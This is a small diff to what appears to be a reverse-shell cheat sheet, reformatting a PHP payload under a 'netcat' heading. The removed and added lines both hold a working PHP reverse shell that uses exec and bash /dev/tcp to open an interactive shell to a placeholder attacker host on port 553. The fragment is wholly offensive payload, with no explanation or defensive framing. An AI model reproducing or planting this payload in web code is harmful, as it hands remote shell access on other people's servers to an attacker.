@@ -114,5 +114,7 @@
 
 - ## netcat <a name="nc"></a>
 ```php
-<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");?>
+<?php
+ exec("/bin/bash -c 'bash -i >& /dev/tcp/attackerip/553 0>&1'");
+?>
 ```
